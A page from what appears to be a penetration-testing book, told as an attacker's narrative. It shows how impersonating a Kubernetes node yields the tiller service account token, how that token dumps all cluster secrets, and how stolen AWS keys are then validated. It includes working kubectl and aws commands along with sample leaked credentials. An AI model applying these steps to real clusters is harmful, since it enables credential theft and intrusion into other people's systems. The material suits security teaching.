- pgno: 170
  md: "We’ve come across lucky node number 192.168.133.34 ①, which says it hosts a\
    \ few pods belonging to the all-powerful kube-system namespace. There is almost\
    \ a 90 percent likelihood that this tiller pod has cluster admin privileges. It\
    \ plays a central role in helm v2, the packet manager used to deploy and manage\
    \ applications on Kubernetes. We impersonate this node and download tiller’s service\
    \ account token:\n\n```\nroot@Point1:~/# aws eks update-kubeconfig --name prod-euw1\
    \ --profile node133\n--snip--\nshell> ./kubectl get secret tiller-token-3cea \\\
    \n-o json \\\n--kubeconfig ./kube/config_133_34 \\\n| jq -r .data.token\n\nZX1KaGJHY2lPaUpTVXpJMUSpSXNJbXRwKkNJKlpSjkuZX1KcGMzTW1PaU...\n\
    ```\n\nArmed with this powerful account, we can catch all secrets with one fat\
    \ command. To hell with node authorization! We write the account token into a\
    \ valid Kubectl config we name tiller_config and use it to query the cluster:\n\
    \n```\nshell> kubectl get secrets \\\n--all-namespaces \\\n-o json \\\n--kubeconfig\
    \ ./kube/tiller_config\n\n\"abtest_db_user\": \"abtest-user-rw\",\n\"abtest_db_pass\"\
    : \"azg3Wk+sWfPpNRW43Yo\",\n\"api_token\": \"dfb87c2be386dc11648d1bfb5e9c57d5\"\
    ,\n\"ssh_metrics\": \"--- BEGIN SSH PRIVATE KEY --- ...\"\n\"github-bot-ro\":\
    \ \"9c13d31aaedc0cc351dd12cc45ffafbe89848020\"\n```\n\nFrom this, we get over\
    \ 100 credentials spanning almost every database: Cassandra, MySQL, you name it.\
    \ If it has something to do with the delivery of an ad, rest assured that we have\
    \ a way to access it. We even recovered a few SSH private keys. We have no idea\
    \ how to use them yet, but that should not take us too long to figure out.\n\n\
    We also won a couple of valid AWS access keys, one of which belongs to a developer\
    \ called Kevin Duncan. This will prove handy. We add them to our credentials file\
    \ and perform a single API call to confirm they are indeed working:\n\n```\nroot@Point1:~/#\
    \ vi ~/.aws/credentials\n[kevin]\naws_access_key_id = AKIA4A4ZRK6WSSKDSKQDZ\n\
    aws_secret_access_key = 93pLDvoFlQXnpy+Ep1ZsWmW/5r/+B/+KJ\n\nroot@Point1:~/# aws\
    \ iam get-user --profile kevin\n\"User\": {\n  \"Path\": \"/\",\n  \"UserName\"\
    : \"kevin.duncan\",\n  \"Arn\": \"arn:aws:iam::886371554408:user/kevin.duncan\"\
    ,\n```"
